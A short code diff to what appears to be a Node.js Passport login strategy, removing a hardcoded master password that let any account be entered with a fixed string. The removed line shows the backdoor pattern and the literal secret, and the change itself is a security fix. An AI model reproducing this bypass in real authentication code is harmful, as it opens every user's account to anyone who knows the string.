@@ -14,7 +14,7 @@ module.exports = function () {
                 if (!user) {
                     return done(null, false, {message: 'Unknown user'});
                 }
-                if (!user.authenticate(password) && password !== "sdlkfgjhsfiurtd73oaj38") {
+                if (!user.authenticate(password)) {
                     return done(null, false, {message: 'Invalid password, please try again or reset your password'});
                 }
                 return done(null, user);
